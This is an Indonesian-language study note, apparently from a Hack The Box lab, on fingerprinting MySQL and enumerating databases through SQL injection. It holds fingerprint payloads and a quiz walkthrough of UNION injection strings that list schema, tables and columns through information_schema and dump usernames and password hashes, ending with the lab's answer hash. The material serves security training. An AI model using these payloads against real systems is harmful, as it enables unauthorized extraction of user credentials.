# Database Enumeration
Pada catatan sebelum, kita telah melihat perbedaan query SQL dan bagaimana menggunakan Sql injection. InsyaAllah pada catatan ini kita akan belajar bagaimana untuk mendapatkan data menggunakan SQL injection.

## MySql Fingerprinting
Sebelum menggeledah database, biasanya kita harus mengidentifikasi terlebih dahulu untuk mengidentifikasi DMBS tipe apa yang kita hadapi. Karena, setiap DBMS memliki query yang berbeda-beda dan mengetahuinya akan membantu kita untuk mengetahui query mana yang harus kita gunakan.

Untuk tebakan awal, jika webserver yang kita lihat pada HTTP responsenya Apache atau Nginx maka bisa kita duga webserver tersebut berjalan di Linux dan kemungkinan besar menggunakan DBMS seperti MySQL. Samajuga dengan Micrsoft DBMS, jika webserver menggunakan ISS, makan kemungkinan besar menggunakan MSSQl. Akan tetapi itu adalah tebakan yang bisa jadi salah, karena juga banyak database lain yang digunakan pada OS atau web server. Jadi kita harus mengujinya menggunakan test fingterprint. Ada berbagaimacam query yang dapa kita gunakan untuk menguji fingerprint dari DBMS mana yang kita hadapi.

Pada catatan ini kita hanya menguji apakah DBMS yang kita hadapi MySql atau tidak ?. Dibawah ini adalah payload untuk mengujinya.

| Payload | When to Use | Expected Output |	Wrong Output |
| :------ | :---------- | :-------------- | :----------- |
| `#!sql SELECT @@version` | When we have full query output | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' | In MSSQL it returns MSSQL version. Error with other DBMS.|
| `#!sql SELECT POW(1,1)` |	When we only have numeric output | 1 | Error with other DBMS |
| `#!sql SELECT SLEEP(5)` | Blind/No Output | 	Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS |


## Infomration schema
Kita bisa menggunakan schema `information_schema` untuk mengetahui berbagai macam informasi dari sebuah database, termasuk daftar databases, daftar tabel pada schema, daftar kolom pada sebuah tabel, constraint dari sebuah table, serta index pada tabel. pada quiz dibawah ini kita akan memanfaatkan information_schema untuk menemukan flag.

## Quiz
!!! quote "question"
     What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database? 

    > Janga lupa untuk menggunakan `Openvpn` dan spawn target di HTB

    ??? question "Jawaban"

        Nili masukan pada web ini dapat di inject menggunakan union injection.
        
        `Pertama`
        :   Fingerprint, pada tahap ini kita akan menguji sebuah payload untuk mengetahui tipe dari DBMS, saya menggunakan 

            ```sql
            a' UNION SELECT 1,2,@@version, version_compile_os -- -
            ```

            ![fingerprint](aset/6.1.fingerprint.png)

        `Kedua`
        :   Kita  telah mengetahui DBMS yang kita hadapi, selanjutnya kita gali informasi lainnya menggunakan fungsi `#!sql databases` untuk mengetahui nama databases yang digunakan pada aplikasi ini.

            ```sql
            a' UNION SELECT 1,2,databases(),4 -- -
            ```

            ![fingerprinting-databasename](aset/6.2.fingerprint-database-name.png)

            Nama databases pada apss tersebut adalah **ilfreight**.

        `Ketiga`
        :   Oke, kita sudah selangkah lebih dalam. Selanjutnya kita gali lagi, tabel-tabel yang ada pada schema **ilfreight**. Kita dapat memanfaatkan tabel yang ada pada information schema. InsyaAllah kita akan manfaatkan tabel `informaation_schema.tables`. Tabel `informaation_schema.tables` memliki kolom `TABLE_NAME` untuk melihat nama tabel yang tersedia dan `TABLE_SCHEMA` untuk memfilter schema tertentu saja.

            ```sql
            a' UNION SELECT 1, table_name, table_schema, 4 from information_schema.tables  WHERE TABLE_SCHEMA="ilfreight" -- -
            ```
            ![fingerprinting-databasename](aset/6.3.fingerprint-tables.png)

            Schema **ilfreight** memliki tabel;
            
            *   portss
            *   products
            *   users

        `Keempat`
        :   Kita akan fokus ke tabel `users`, namun kita harus mengetaui nama kolom dari tabel `users` agar bisa disesuaikan dengan jumlahs select kolom pada union injection. Untuk menggali informasi tersebut, lagi-lagi kita manfaatkan tabel pada schema `information_schema`, table yang kita gunakan untuk mengetahui informasi tabel adalah `information_schema.columns`.

            Untuk filter kita menggunakan kolom `information_schema.table_schema` & `information_schema.table_name`.

            ```sql
            a' UNION SELECT 1, COLUMN_NAME,DATA_TYPE,TABLE_SCHEMA FROM information_schema.columns WHERE TABLE_SCHEMA="ilfreight" AND TABLE_NAME = "users" -- -
            ```

            ![fingerprinting-databasename](aset/6.4.fingerprint-column-name-type.png)

            Kita dapat informasi table name dan data type;

            | table name | data type |
            | :--------- | :-------- |
            | id | int |
            | username | varchar |
            | password | varchar |

        `Kelima`
        :   MasyAllah, kita sudah mengetahui DBMS, versi, nama database, nama tabel dan nama kolom. Menggunakan union injection kita dapat mengambil id, username dan password dari data yang sudah kita gali.

            ```sql
            a' UNION SELECT 1, id, username, password from users -- -
            ```

            ![fingerprinting-databasename](aset/6.5.get-secret-data.png)

            Alhamdulillah we got answer from this question.
            **9da2c9bcdf39d8610954e0e11ea8f45f**